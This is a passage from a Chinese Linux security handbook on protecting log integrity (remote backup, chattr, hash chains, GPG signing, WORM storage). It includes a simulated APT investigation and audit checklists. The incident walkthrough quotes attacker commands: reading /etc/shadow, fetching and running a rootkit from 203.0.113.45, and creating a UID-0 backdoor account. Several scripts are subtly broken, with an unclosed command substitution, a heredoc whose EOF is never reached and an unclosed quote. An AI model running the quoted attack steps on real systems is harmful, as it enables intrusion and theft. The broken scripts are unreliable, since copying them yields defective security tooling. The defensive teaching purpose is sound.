
## 4.21 日志完整性保护

### 4.21.1 日志远程备份方法

日志远程备份是保护日志完整性的第一道防线。攻击者入侵系统后往往会尝试修改或删除日志以掩盖行踪，如果日志只存储在本地，攻击者可以轻易销毁证据。远程备份确保即使本地日志被篡改，仍有一份完整的副本可用于调查取证。

远程备份的方式有多种：定时脚本备份（简单但有延迟）、实时同步（rsync等工具，接近实时）、远程syslog转发（syslog/rsyslog实时转发）、专用日志服务器（集中收集）。生产环境建议采用多种方式结合，确保日志的安全性和可用性。

```bash
# ========== 方案1: rsync定时远程备份 ==========

# 安装rsync
yum install rsync    # CentOS
apt-get install rsync  # Debian/Ubuntu

# 创建备份脚本
cat > /usr/local/bin/log-remote-backup.sh << 'EOF'
#!/bin/bash
# 日志远程备份脚本

# 配置
REMOTE_USER="logbackup"
REMOTE_HOST="backup-server.example.com"
REMOTE_DIR="/data/log-backups/$(hostname)"
LOCAL_LOG_DIR="/var/log"
LOG_FILE="/var/log/log-backup.log"
RETENTION_DAYS=90

# 日志函数
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S'] $1" >> "$LOG_FILE"
}

log "开始日志备份开始"

# 1. 创建压缩包（按日期命名）
BACKUP_FILE="/tmp/log-backup-$(date +%Y%m%d-%H%M%S).tar.gz"
tar -czf "$BACKUP_FILE" -C / "$LOCAL_LOG_DIR" 2>/dev/null

if [ $? -eq 0 ]; then
    log "日志压缩完成: $BACKUP_FILE"
    FILE_SIZE=$(du -h "$BACKUP_FILE" | cut -f1)
    log "文件大小: $FILE_SIZE"
else
    log "ERROR: 日志压缩失败"
    exit 1
fi

# 2. 传输到远程服务器（使用SSH密钥认证）
rsync -avz --progress \
    -e "ssh -p 22 -i /root/.ssh/log-backup-key" \
    "$BACKUP_FILE" \
    "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_DIR}/"

if [ $? -eq 0 ]; then
    log "日志传输成功"
else
    log "ERROR: 日志传输失败"
    exit 1
fi

# 3. 计算并记录校验和
CHECKSUM=$(sha256sum "$BACKUP_FILE" | awk '{print $1}')
log "SHA256: $CHECKSUM"

# 将校验和保存到远程
echo "$CHECKSUM $(basename $BACKUP_FILE)" | ssh -i /root/.ssh/log-backup-key ${REMOTE_USER}@${REMOTE_HOST} "cat >> ${REMOTE_DIR}/checksums.txt"

# 4. 清理本地临时文件
rm -f "$BACKUP_FILE"
log "本地临时文件已清理"

# 5. 清理远程过期备份（可选）
ssh -i /root/.ssh/log-backup-key "${REMOTE_USER}@${REMOTE_HOST}" \
    "find $REMOTE_DIR -name 'log-backup-*.tar.gz' -mtime +$RETENTION_DAYS -delete"

log "日志备份完成"
exit 0
EOF

chmod +x /usr/local/bin/log-remote-backup.sh

# 设置SSH密钥认证
ssh-keygen -t rsa -b 4096 -f /root/.ssh/log-backup-key -N ""
ssh-copy-id -i /root/.ssh/log-backup-key.pub logbackup@backup-server.example.com

# 添加到crontab（每小时执行一次
echo "0 * * * * root /usr/local/bin/log-remote-backup.sh" > /etc/cron.d/log-backup
```

```bash
# ========== 方案2: 实时日志转发（rsyslog）==========
# 最可靠的方式，日志生成时同时写入本地和远程

# 在客户端配置
cat > /etc/rsyslog.d/99-remote-backup.conf << 'EOF'
# 实时转发所有日志到远程服务器
# 使用磁盘队列确保网络中断时不丢失

*.* action(
    type="omfwd"
    target="log-backup.example.com"
    port="6514"
    protocol="tcp"
    
    # TLS加密
    streamdriver="gtls"
    streamdrivermode="1"
    streamdriverauthmode="x509/name"
    streamdriverpermittedpeers="log-backup.example.com"
    
    # 磁盘队列（可靠缓冲）
    queue.type="Disk"
    queue.filename="remote_backup_queue"
    queue.maxdiskspace="10g"
    queue.saveonshutdown="on"
    
    # 重连设置
    action.resumeRetryCount="-1"
    action.resumeInterval="30"
)

# 安全日志额外转发到专用服务器
if $syslogfacility-text == 'auth' or $syslogfacility-text == 'authpriv' then {
    action(
        type="omfwd"
        target="secure-log.example.com"
        port="6514"
        protocol="tcp"
        streamdriver="gtls"
        streamdrivermode="1"
        queue.type="Disk"
        queue.filename="secure_log_queue"
        queue.maxdiskspace="5g"
    )
}
EOF

systemctl restart rsyslog

# ========== 方案3: 第三方云存储备份 ==========
# 使用AWS S3、阿里云OSS等对象存储

# 安装aws-cli
pip install awscli
# 或
yum install awscli

# 配置凭证
aws configure

# 备份脚本
cat > /usr/local/bin/log-s3-backup.sh << 'EOF'
#!/bin/bash
S3_BUCKET="my-log-backup"
HOSTNAME=$(hostname)
DATE=$(date +%Y%m%d)

# 打包当天日志
tar -czf /tmp/logs-${DATE}.tar.gz /var/log/ 2>/dev/null

# 上传到S3（使用Glacier存储类节省成本）
aws s3 cp /tmp/logs-${DATE}.tar.gz \
    s3://${S3_BUCKET}/${HOSTNAME}/logs-${DATE}.tar.gz \
    --storage-class GLACIER

# 生成校验和
SHA256=$(sha256sum /tmp/logs-${DATE}.tar.gz | awk '{print $1}')
echo "$SHA256 logs-${DATE}.tar.gz" | \
    aws s3 cp - s3://${S3_BUCKET}/${HOSTNAME}/checksums-${DATE}.txt

# 清理本地
rm -f /tmp/logs-${DATE}.tar.gz

logger -t log-backup "日志已备份到S3"
EOF

chmod +x /usr/local/bin/log-s3-backup.sh
```

### 4.21.2 日志防篡改技术

日志防篡改是确保日志可信度的关键。如果攻击者能够修改日志，那么日志就失去了作为证据的价值。日志防篡改技术包括：文件系统级保护、加密签名、只追加模式、区块链存证等。不同技术可以单独使用，也可以组合使用，形成多层防护。

Linux的chattr命令可以设置文件的特殊属性，如只追加（append-only）和不可变（immutable）属性。append-only属性允许文件被追加写入，但不能修改或删除已有的内容。immutable属性则完全禁止修改、删除、重命名文件。这两个属性是最基础也是最有效的日志防篡改手段。

```bash
# ========== 1. 文件系统级保护 ==========

# 设置只追加属性（安全日志推荐使用）
# 只能追加，不能修改或删除已有内容
chattr +a /var/log/auth.log
chattr +a /var/log/secure
chattr +a /var/log/audit/audit.log

# 设置不可变属性（归档日志使用）
# 完全不能修改
chattr +i /var/log/auth.log.1.gz

# 查看文件属性
lsattr /var/log/auth.log
# 输出示例：
# -----a--------e------- /var/log/auth.log

# 移除属性
chattr -a /var/log/auth.log
chattr -i /var/log/auth.log.1.gz

# 注意：logrotate需要临时移除a属性才能轮转
# 所以需要在logrotate的prerotate/postrotate中处理

# ========== 2. 哈希校验 ==========

# 创建基线哈希
sha256sum /var/log/auth.log > /var/log/auth.log.sha256

# 验证完整性
sha256sum -c /var/log/auth.log.sha256

# 自动校验脚本
cat > /usr/local/bin/log-integrity-check.sh << 'EOF'
#!/bin/bash
# 日志完整性校验脚本

BASELINE_DIR="/var/log/integrity-baseline"
LOG_FILE="/var/log/integrity-check.log"
ALERT_EMAIL="admin@example.com"

mkdir -p "$BASELINE_DIR"

check_file() {
    local file="$1"
    local baseline="$BASELINE_DIR/$(basename $file).sha256"
    
    if [ ! -f "$baseline" ]; then
        # 首次运行，创建基线
        sha256sum "$file" > "$baseline"
        echo "[$(date)] 基线已创建: $file" >> "$LOG_FILE"
        return 0
    fi
    
    # 验证
    if sha256sum -c "$baseline" &>/dev/null; then
        return 0
    else
        echo "[$(date)] 警告: $file 完整性校验失败!" >> "$LOG_FILE"
        echo "原始哈希: $(cat $baseline)" >> "$LOG_FILE"
        echo "当前哈希: $(sha256sum $file)" >> "$LOG_FILE"
        
        # 发送告警
        echo "日志文件 $file 可能被篡改!" | mail -s "日志完整性告警" "$ALERT_EMAIL"
        
        # 更新基线（可选，正常轮转后需要更新）
        # sha256sum "$file" > "$baseline"
        return 1
    fi
}

# 检查关键日志文件
for logfile in \
    /var/log/auth.log \
    /var/log/syslog \
    /var/log/audit/audit.log \
    /var/log/kern.log
do
    if [ -f "$logfile" ]; then
        check_file "$logfile"
    fi
done

# ========== 3. 日志签名与验证 ==========

# 使用GPG签名日志文件（非对称加密签名
# 生成密钥对（首次使用）
# gpg --gen-key

# 签名日志文件
gpg --detach-sign --armor /var/log/auth.log.1

# 验证签名
gpg --verify /var/log/auth.log.1.asc /var/log/auth.log.1

# 自动签名脚本（配合logrotate使用）
cat > /usr/local/bin/sign-log-file.sh << 'EOF'
#!/bin/bash
# 日志文件签名脚本
# 在logrotate的postrotate中调用

LOG_FILE="$1"
GPG_KEY_ID="your-key-id"

if [ -f "$LOG_FILE" ]; then
    gpg --detach-sign --armor --batch --yes \
        --local-user "$GPG_KEY_ID" \
        "$LOG_FILE"
    logger -t log-sign "已签名: $LOG_FILE"
fi
EOF

chmod +x /usr/local/bin/sign-log-file.sh

# ========== 4. 日志链式哈希（哈希链）==========
# 每条日志的哈希包含前一条日志的哈希，形成链
# 篡改任何一条都会破坏链的完整性

# 简单实现：使用脚本生成日志链哈希
cat > /usr/local/bin/log-chain-hash.sh << 'EOF'
#!/bin/bash
# 日志链哈希保护

LOG_FILE="/var/log/auth.log"
HASH_CHAIN_FILE="/var/log/hash-chain.log"
LAST_HASH_FILE="/var/log/last-hash.txt"

# 初始化
if [ ! -f "$LAST_HASH_FILE" ]; then
    echo "INIT" > "$LAST_HASH_FILE"
fi

# 读取新的日志行
LAST_HASH=$(cat "$LAST_HASH_FILE")
NEW_ENTRIES=0

tail -n +$(cat /var/log/hash-pos 2>/dev/null || echo 0) "$LOG_FILE" | while read line; do
    # 计算当前行+上次哈希的组合哈希
    CURRENT_HASH=$(echo -n "$LAST_HASH$line" | sha256sum | awk '{print $1}')
    echo "$CURRENT_HASH" >> "$HASH_CHAIN_FILE"
    LAST_HASH="$CURRENT_HASH"
    ((NEW_ENTRIES++))
done

# 更新位置
wc -l < "$LOG_FILE" > /var/log/hash-pos
echo "$LAST_HASH" > "$LAST_HASH_FILE"

echo "处理了 $NEW_ENTRIES 条日志记录"
EOF

# ========== 5. 审计系统自保护 ==========

# 审计auditd自身的日志也需要保护
# auditd有自己的防篡改机制

# 配置auditd在磁盘满时挂起系统（防止日志丢失）
# /etc/audit/auditd.conf:
# disk_full_action = SUSPEND
# disk_error_action = SUSPEND

# 监控审计日志文件本身
auditctl -w /var/log/audit/ -p wa -k audit_log_access

# 监控audit配置文件
auditctl -w /etc/audit/ -p wa -k audit_config_change

# 监控rsyslog配置
auditctl -w /etc/rsyslog.conf -p wa -k syslog_config
auditctl -w /etc/rsyslog.d/ -p wa -k syslog_config

# ========== 6. 不可篡改的远程日志 ==========

# 使用专门的日志服务器，设置为只追加
# 日志服务器上：
# 所有日志文件设置chattr +a
# 关闭远程登录（只允许日志端口）
# 物理安全保护

# 远程日志服务器加固建议：
# 1. 最小化安装（只运行rsyslog）
# 2. 防火墙只开放514和6514端口
# 3. SSH只允许从管理IP访问
# 4. 所有日志文件设置append-only
# 5. 定期备份到离线存储
# 6. 禁用root登录，使用sudo

# ========== 7. 日志完整性监控 ==========

# 使用AIDE（Advanced Intrusion Detection Environment）
# AIDE可以监控文件完整性

# 安装AIDE
yum install aide    # CentOS
apt-get install aide  # Debian/Ubuntu

# 初始化数据库
aide --init
mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz

# 配置监控日志文件
# /etc/aide.conf中添加：
# /var/log/auth.log CONTENT_EXPAND
# /var/log/audit/ CONTENT_EX

# 定期检查
aide --check

# 自动检查脚本
cat > /etc/cron.daily/aide-check << 'EOF'
#!/bin/bash
/usr/sbin/aide --check > /var/log/aide/aide-check-$(date +%Y%m%d).log 2>&1
if [ $? -ne 0 ]; then
    mail -s "AIDE完整性检查告警" admin@example.com < /var/log/aide/aide-check-$(date +%Y%m%d).log
fi
EOF
chmod +x /etc/cron.daily/aide-check
```

### 4.21.3 WORM存储概念

WORM是Write Once Read Many（一次写入，多次读取）的缩写，是一种存储技术，确保数据一旦写入就不能被修改或删除，只能被读取。WORM存储对于合规审计和法律证据至关重要，因为它保证了日志数据的原始性和不可篡改性。

WORM存储的实现方式有多种：硬件级WORM（如专用磁带库、光盘库）、软件级WORM（文件系统级别的WORM属性）、对象存储WORM（如云存储的对象锁定功能）。金融、医疗、政府等行业的合规要求通常明确规定必须使用WORM存储来保存审计日志。

```bash
# ========== WORM存储技术概览 ==========
#
# 1. 硬件WORM
#    - 磁带WORM（LTO WORM磁带）
#    - 光盘（CD-R、DVD-R、BD-R）
#    - 专用WORM磁盘阵列
#    优点：物理上不可篡改，法律效力高
#    缺点：成本高，访问慢
#
# 2. 软件WORM
#    - 文件系统WORM（ext4的immutable属性）
#    - NetApp SnapLock
#    - EMC Centera
#    - Isilon SmartLock
#    优点：管理方便，访问快
#    缺点：依赖软件实现，可能有漏洞
#
# 3. 对象存储WORM
#    - AWS S3 Object Lock
#    - 阿里云OSS WORM
#    - 华为OBS WORM
#    优点：弹性扩展，成本适中
#    缺点：依赖云服务商
#
# 4. 区块链存证
#    - 区块链时间戳服务
#    - 司法存证平台
#    优点：去中心化，可信度高
#    缺点：成本高，吞吐量有限

# ========== Linux文件系统级WORM实现 ==========

# 使用ext4的immutable属性实现简单WORM
# 对于归档日志文件

# 创建WORM存储目录
mkdir -p /worm-archive/logs

# 归档日志时设置不可变属性
archive_log() {
    local logfile="$1"
    local archive_name="/worm-archive/logs/$(basename $logfile)-$(date +%Y%m%d).gz
    
    # 压缩
    gzip -c "$logfile" > "$archive_name"
    
    # 设置不可变属性
    chattr +i "$archive_name"
    
    # 记录
    logger -t worm-archive "已归档到WORM: $archive_name"
}

# 使用示例
archive_log /var/log/auth.log.1

# 验证（不能修改）
# rm /worm-archive/logs/auth.log.1-20260101.gz
# rm: cannot remove 'auth.log.1.gz': Operation not permitted

# ========== 使用GlusterFS WORM卷 ==========

# GlusterFS支持WORM特性

# 创建WORM卷
gluster volume create worm-vol \
    replica 3 \
    server1:/gluster/worm \
    server2:/gluster/worm \
    server3:/gluster/worm

# 启用WORM
gluster volume set worm-vol features.worm on

# 设置保留期
gluster volume set worm-vol features.worm-retention-period 365

# 挂载
mount -t glusterfs server1:/worm-vol /mnt/worm

# ========== 云对象存储WORM示例（AWS S3）==========

# 1. 启用对象锁定（创建桶时设置）
aws s3api create-bucket \
    --bucket my-log-worm-bucket \
    --region us-east-1 \
    --object-lock-enabled-for-bucket

# 2. 设置保留策略
aws s3api put-object-lock-configuration \
    --bucket my-log-worm-bucket \
    --object-lock-configuration '{
        "ObjectLockEnabled": "Enabled",
        "Rule": {
            "DefaultRetention": {
                "Mode": "COMPLIANCE",
                "Days": 365
            }
        }
    }'

# 3. 上传日志文件（自动应用保留）
aws s3 cp /var/log/auth.log.1.gz \
    s3://my-log-worm-bucket/auth.log.1.gz

# 4. 验证保留设置
aws s3api get-object-retention \
    --bucket my-log-worm-bucket \
    --key auth.log.1.gz

# COMPLIANCE模式：
# - 任何用户（包括root）都不能删除或修改
# - 保留期到期前不能缩短
# - 只能延长保留期
# GOVERNANCE模式：
# - 特殊权限用户可以删除
# - 用于日常管理

# ========== WORM存储最佳实践 ==========

# 1. 分级策略：
#    - 热日志（7天）：普通存储，快速查询
#    - 温日志（30天）：普通存储，定期查询
#    - 冷日志（90天）：低成本存储，偶尔查询
#    - 归档日志（1-7年）：WORM存储，合规保留

# 2. 保留周期参考：
#    - 一般安全日志：至少1年
#    - 金融行业：5-7年
#    - 医疗行业：6-10年
#    - 政府部门：10年以上
#    - 国家安全：永久

# 3. 合规标准要求：
#    - PCI-DSS：至少1年，90天内在线可查
#    - HIPAA：6年
#    - SOX：7年
#    - GDPR：不规定但要求可证明

# 4. 验证WORM完整性的脚本

cat > /usr/local/bin/worm-verify.sh << 'EOF'
#!/bin/bash
# WORM存储完整性验证脚本

WORM_DIR="/worm-archive/logs"
REPORT="/var/log/worm-verify-report.txt"

echo "WORM存储完整性验证 - $(date)" > "$REPORT"
echo "========================================" >> "$REPORT"
echo "" >> "$REPORT"

echo "1. 文件数量统计：" >> "$REPORT"
find "$WORM_DIR" -type f | wc -l >> "$REPORT"
echo "" >> "$REPORT"

echo "2. 不可变属性检查：" >> "$REPORT"
find "$WORM_DIR" -type f | while read f; do
    attrs=$(lsattr "$f" 2>/dev/null | awk '{print $1}')
    if [[ "$attrs" == *i* ]]; then
        status="OK"
    else
        status="FAIL"
        echo "警告: $f 没有设置immutable属性!" >> "$REPORT"
    fi
done

echo "" >> "$REPORT"
echo "3. 存储使用情况：" >> "$REPORT"
df -h "$WORM_DIR" >> "$REPORT"

echo "" >> "$REPORT"
echo "验证完成: $(date)" >> "$REPORT"

cat "$REPORT"
EOF

chmod +x /usr/local/bin/worm-verify.sh

# 每周执行一次
echo "0 2 * * 0 root /usr/local/bin/worm-verify.sh" > /etc/cron.d/worm-verify
```

## 4.22 完整实战案例：APT入侵溯源分析

### 4.22.1 案例背景与发现过程

本案例模拟一起典型的APT（高级持续性威胁）入侵事件的完整分析过程。某企业的安全运营团队在日常日志巡检中发现异常，通过层层分析各类日志，逐步还原攻击路径，最终定位入侵源头并完成处置。案例涵盖了从初步发现到深度分析、再到溯源和处置的全过程，展示了日志分析在安全事件响应中的核心作用。

**企业环境概览**：某中型互联网企业，拥有约50台Linux服务器，包括Web服务器、应用服务器、数据库服务器、办公网等。已部署集中日志服务器（rsyslog）、auditd审计系统、ELK日志分析平台。安全团队每周进行一次日志巡检，每天自动生成安全报告。

```bash
# ========== 第1天：异常发现 ==========
#
# 周一早上，安全分析师小王运行每周日志巡检报告时发现异常：

# 1. 查看本周安全报告概览
aureport -ts $(date -d 'last monday' +%D) -te $(date +%D) -i --summary

# 发现异常点：
# - 认证失败次数比上周增加了300%
# - 有一个外部IP在SSH登录失败次数异常
# - Web服务器有异常文件修改记录

# 2. 深入查看失败登录TOP10
ausearch -ts $(date -d '7 days ago' +%D) -m USER_AUTH -sv no -i | \
    grep "addr=" | awk '{print $NF}' | sort | uniq -c | sort -rn | head -10

# 输出显示：
# 2847 203.0.113.45    ← 异常高
#  156 198.51.100.23
#  ...

# 3. 查看这个IP的详细情况
ausearch -ts $(date -d '7 days ago' +%D) -m USER_AUTH -sa 203.0.113.45 -i | head -50

# 发现：
# - 该IP从3天前开始暴力破解
# - 尝试了root、admin、test、guest等多个用户名
# - 主要集中在凌晨2-5点

# 4. 检查是否有成功登录（关键！）
ausearch -ts $(date -d '7 days ago' +%D) -m USER_AUTH -sv yes -sa 203.0.113.45 -i

# 输出：
# time->Thu Jun 23 03:15:22 2026
# type=USER_AUTH msg=audit(1234567.890:12345): user pid=12345 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="webadmin" exe="/usr/sbin/sshd" hostname=203.0.113.45 addr=203.0.113.45 terminal=ssh res=success'

# 确认：webadmin用户已被攻破！时间是6月23日凌晨3:15

# ========== 第2步：影响范围确认 ==========

# 1. 查看该用户的所有活动
ausearch -ts 06/23/2026 03:00:00 -ua webadmin -i | head -100

# 发现：
# - 登录后立即执行了几个命令
# - 查看了/etc/passwd
# - 下载了某个文件
# - 建立了新的SSH密钥

# 2. 查看webadmin执行的命令
ausearch -ts 06/23/2026 03:00:00 -te 06/23/2026 04:00:00 \
    -c bash -m EXECVE -i | head -50

# 发现执行了：
# - id
# - whoami
# - cat /etc/passwd
# - cat /etc/shadow  ← 危险！
# - wget http://203.0.113.45/tools/rootkit.tar.gz
# - tar zxf rootkit.tar.gz
# - ./install.sh

# 确认：攻击者上传并执行了rootkit安装脚本！

# 3. 检查主机名和IP
# 这台服务器是 web-server-03 (10.0.1.23)
```

```bash
# ========== 第3步：横向移动检测 ==========

# 攻击者获得初始访问权限后，通常会进行横向移动

# 1. 检查内网扫描行为
# 查看web-server-03的出站连接
ausearch -ts 06/23/2026 -i -k network_socket | grep -i "connect"

# 或检查auth.log中的SSH连接
grep "web-server-03" /var/log/remote/*/auth.log | grep "Accepted"

# 发现：
# web-server-03 成功 SSH登录到：
# - app-server-05 (10.0.2.15)
# - db-server-01 (10.0.3.10)
# - 还有其他几台...

# 2. 检查横向移动的时间线
ausearch -ts 06/23/2026 04:00:00 -te 06/23/2026 12:00:00 \
    -m USER_AUTH -i | grep "10.0.1.23"

# 发现攻击者用同一账号在多台服务器登录

# 3. 数据库服务器检查
# 在db-server-01上检查
ausearch -ts 06/23/2026 -i -f /etc/shadow

# 发现攻击者：
# - 读取了数据库配置文件
# - 执行了数据库dump
# - 下载了数据库备份

# ========== 第4步：数据泄露检测 ==========

# 1. 检查大流量异常
# 查看Web服务器的出站流量统计
grep "db-server-01" /var/log/nginx/access.log | awk '{sum += $10} END {print sum/1024/1024 " MB"}'

# 2. 检查异常大文件传输
# 查找大文件下载
awk '$10 > 10485760' /var/log/nginx/access.log | head -20  # >10MB

# 3. 检查外发连接到可疑IP
ss -tnp | grep ESTAB | grep -v "10.0.0.0/8"

# 发现：
# 有大量数据传输到 203.0.113.45 的443端口

# ========== 第5步：权限提升检测 ==========

# 1. 检查sudo使用
ausearch -ts 06/23/2026 -c sudo -i

# 2. 检查setuid文件变化
find / -perm -4000 -newer /etc/passwd 2>/dev/null

# 3. 检查root用户活动
ausearch -ts 06/23/2026 -e 0 -m EXECVE -i | head -50

# 发现：
# 攻击者通过sudo提权成功
# 安装了rootkit
# 创建了后门账户
```

```bash
# ========== 第6步：持久化机制分析 ==========

# 1. 检查新增用户
ausearch -ts 06/20/2026 -k user_mgmt -i

# 发现：
# 6月23日 创建了用户 sysaccount
# useradd -u 0 -o sysaccount  ← UID 0的后门账号！

# 2. 检查crontab变化
ausearch -ts 06/23/2026 -k cron_config -i

# 发现：
# 添加了每分钟执行的反向shell任务

# 3. 检查SSH密钥
ls -la /root/.ssh/
cat /root/.ssh/authorized_keys

# 发现攻击者添加了SSH公钥

# 4. 检查系统服务
systemctl list-unit-files --type=service | grep enabled

# 发现可疑服务：backdoor.service

# 5. 检查ld.so.preload
cat /etc/ld.so.preload
# 发现有内容，说明可能有rootkit

# 6. 检查内核模块
lsmod
# 发现可疑模块：hideproc

# ========== 第7步：攻击时间线重建 ==========

# 根据日志重建完整攻击时间线：

# 6月20日 22:00 - 开始SSH暴力破解
# 6月23日 03:15 - 成功破解webadmin账号
# 6月23日 03:16 - 信息收集（id, whoami, cat /etc/passwd）
# 6月23日 03:18 - 下载并安装rootkit
# 6月23日 03:25 - 创建后门用户sysaccount（UID 0）
# 6月23日 03:30 - 添加SSH公钥
# 6月23日 04:00 - 横向移动到app-server-05
# 6月23日 05:30 - 横向移动到db-server-01
# 6月23日 06:00 - 数据库数据窃取
# 6月23日 08:00 - 数据外传开始
# 6月23日 12:00 - 清理日志痕迹
# 6月25日 10:00 - 被安全团队发现

# ========== 第8步：证据保全与处置 ==========

# 1. 立即隔离受感染主机
# 网络隔离（在交换机或防火墙操作
iptables -A INPUT -s 203.0.113.45 -j DROP

# 2. 保全证据
# 内存镜像（使用dd或专用工具）
dd if=/dev/mem of=/evidence/mem.dump

# 磁盘镜像
dd if=/dev/sda of=/evidence/disk.img bs=4096

# 日志备份（只读挂载
mount -o ro /dev/sda1 /mnt/evidence

# 保存易失证据
# - 进程列表
ps auxf > /evidence/process.txt
# - 网络连接
netstat -tulpn > /evidence/network.txt
# - 内存信息
cat /proc/meminfo > /evidence/memory.txt
# - 内核模块
lsmod > /evidence/modules.txt

# 3. 清除与恢复
# - 重新安装受感染服务器
# - 重置所有密码
# - 吊销被泄露的密钥
# - 修补漏洞
# - 加强安全加固
```

### 4.22.2 入侵检测与分析经验总结

通过这个案例，我们可以总结出以下经验教训和最佳实践。日志分析在安全事件响应中的作用至关重要，但只有建立完善的日志体系和分析能力，才能在攻击发生时快速发现、准确分析、有效处置。

**关键经验教训**：

1. **日志集中化是基础**：如果没有集中日志服务器，就很难跨服务器进行关联分析，发现横向移动等高级攻击。
2. **审计系统是利器**：auditd提供的详细审计记录是溯源的关键，没有auditd，很多攻击的具体操作无从知晓。
3. **及时告警自动化**：人工巡检发现太晚了3天，如果有实时告警，就能更早发现。
4. **多日志关联分析**：需要结合认证日志、审计日志、Web日志，才能完整还原攻击路径。
5. **白名单基线**：建立正常行为基线，异常才能更容易发现。

```bash
# ========== 改进措施 ==========

# 1. 加固SSH安全
# 禁用密码登录，只用密钥
# /etc/ssh/sshd_config:
# PasswordAuthentication no
# PermitRootLogin no
# MaxAuthTries 3

# 2. 安装fail2ban
apt-get install fail2ban
# 自动封禁暴力破解IP

# 3. 加强auditd规则
# 增加更多关键文件和命令监控

# 4. 部署实时告警
# ELK Watcher 或 Zabbix 监控

# 5. 网络分段
# 限制服务器之间访问

# 6. 多因素认证
# SSH使用MFA

# 7. 定期渗透测试
# 定期检查漏洞

# 8. 备份与灾难恢复
```

## 4.23 日志审计检查清单

### 4.23.1 配置检查清单

日志系统的配置正确性是日志安全的基础。配置错误可能导致日志不完整、不可靠、被篡改。定期检查配置，确保日志系统按照安全最佳实践配置。

检查清单按类别组织，方便逐项核对。每个检查项都有说明和检查方法。建议每月至少执行一次全面检查，重要系统每周检查。

```bash
# =============================================
# 日志系统配置检查清单
# =============================================

# 【1. rsyslog/syslog-ng 配置检查

# 1.1 服务运行状态
systemctl status rsyslog
# 检查：服务是否运行，是否开机自启
systemctl is-enabled rsyslog

# 1.2 配置文件权限
ls -la /etc/rsyslog.conf
ls -la /etc/rsyslog.d/
# 权限应为 root:root 644

# 1.3 日志文件权限
ls -la /var/log/auth.log
ls -la /var/log/syslog
ls -la /var/log/audit/audit.log
# 安全日志应为 600 或 640，属主root

# 1.4 远程日志转发配置
grep -E "(@@|@)" /etc/rsyslog.conf /etc/rsyslog.d/*.conf
# 检查是否配置了远程日志服务器

# 1.5 TLS加密传输
grep -i "gtls\|ssl\|tls" /etc/rsyslog.d/*.conf
# 生产环境建议启用TLS

# 1.6 队列配置（可靠性）
grep -i "queue" /etc/rsyslog.d/*.conf
# 检查是否有磁盘队列等可靠传输

# 1.7 时间同步
timedatectl status
# NTP是否同步，时间准确是日志准确的前提

# =============================================
# 【2. logrotate 配置检查

# 2.1 logrotate是否安装
which logrotate

# 2.2 主配置文件
ls -la /etc/logrotate.conf

# 2.3 日志轮转配置完整性
ls -la /etc/logrotate.d/
# 检查重要日志是否都配置了轮转

# 2.4 安全日志轮转
cat /etc/logrotate.d/rsyslog
# 检查保留时间：
# - 安全日志至少保留90天
# - 压缩开启
# - 权限正确

# 2.5 轮转频率
grep -r "weekly\|daily\|monthly" /etc/logrotate.d/
# 根据需求确定

# 2.6 cron任务
ls -la /etc/cron.daily/logrotate
# 确认定时任务存在

# =============================================
# 【3. auditd 配置检查

# 3.1 auditd服务状态
systemctl status auditd
systemctl is-enabled auditd

# 3.2 auditd配置文件
ls -la /etc/audit/auditd.conf
# 权限640 root:root

# 3.3 审计规则
auditctl -l
# 检查规则数量，应该有规则

# 3.4 关键文件监控
# 检查是否监控以下文件：
# /etc/passwd, /etc/shadow, /etc/sudoers
# /etc/ssh/sshd_config

# 3.5 日志文件大小
grep max_log_file /etc/audit/auditd.conf

# 3.6 磁盘满处理
grep "disk_full_action\|disk_error_action" /etc/audit/auditd.conf
# 建议SUSPEND或SYSLOG

# 3.7 规则文件权限
ls -la /etc/audit/rules.d/
# 640 root:root

# =============================================
# 【4. 日志文件检查

# 4.1 日志文件存在性
ls -la /var/log/auth.log /var/log/syslog /var/log/audit/audit.log

# 4.2 日志文件大小
du -sh /var/log/*
# 检查是否有异常大小

# 4.3 日志属主和权限
# 安全日志应为root:root 600
# 系统日志应为root:adm 640

# 4.4 日志完整性
# 检查是否有异常修改
stat /var/log/auth.log

# 4.5 日志时间连续性
# 检查最近是否有中断
tail -f /var/log/syslog

# 4.6 日志轮转正常
ls -la /var/log/auth.log*
# 检查轮转文件是否存在

# =============================================
# 【5. 系统时间检查

# 5.1 时区设置
date
# 时区正确

# 5.2 NTP同步
ntpq -p 或 chronyc tracking
# 同步正常

# 5.3 时间准确性
# 与标准时间对比

# =============================================
# 【6. 远程日志服务器检查

# 6.1 接收端口监听
ss -tlnp | grep 514
ss -ulnp | grep 514
# TCP和UDP是否正常

# 6.2 TLS端口
ss -tlnp | grep 6514

# 6.3 接收日志目录
ls -la /var/log/remote/
# 是否正常接收日志

# 6.4 防火墙规则
iptables -L -n | grep 514
# 访问控制

# 6.5 磁盘空间
df -h /var/log
# 充足

# =============================================
# 【7. 日志备份检查

# 7.1 本地备份
ls -la /data/log-backup/
# 备份文件

# 7.2 远程备份
# 检查远程备份服务器

# 7.3 备份频率
# 每天备份

# 7.4 备份保留期
# 符合要求

# 7.5 备份可恢复性
# 定期恢复测试

# =============================================
# 【8. 安全加固检查

# 8.1 日志文件append-only属性
lsattr /var/log/auth.log
# 是否+a属性

# 8.2 审计系统
auditctl -s
# 启用

# 8.3 日志防篡改
# hash校验

# 8.4 日志监控
# 监控系统监控

# 8.5 访问控制
# 日志只有root可读
# /var/log权限

# =============================================
# 【9. ELK Stack 检查

# 9.1 Elasticsearch状态
curl -s http://localhost:9200/_cluster/health | python -m json.tool

# 9.2 索引状态
curl -s http://localhost:9200/_cat/indices?v

# 9.3 Logstash状态
systemctl status logstash

# 9.4 Kibana可访问
curl -s http://localhost:5601/api/status

# 9.5 索引生命周期
# ILM策略配置
```

### 4.23.2 日常检查清单

日常检查是安全运营的常规工作，确保日志系统正常运行。每天或每周执行的简短检查，快速发现问题。

日常检查应该自动化脚本完成，人工确认。检查重点是服务状态、磁盘空间、错误日志、告警信息。

```bash
#!/bin/bash
# 日常日志检查脚本
# filename: daily-log-check.sh
# 每日运行，生成检查报告

REPORT="/var/log/security/daily-check-$(date +%Y%m%d).txt"

echo "========================================" > "$REPORT"
echo "日常日志检查报告 - $(date)" >> "$REPORT"
echo "========================================" >> "$REPORT"
echo "" >> "$REPORT"

echo "【1. 服务状态检查】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

# rsyslog
if systemctl is-active --quiet rsyslog; then
    echo "✓ rsyslog 服务运行中" >> "$REPORT"
else
    echo "✗ rsyslog 服务未运行!" >> "$REPORT"
fi

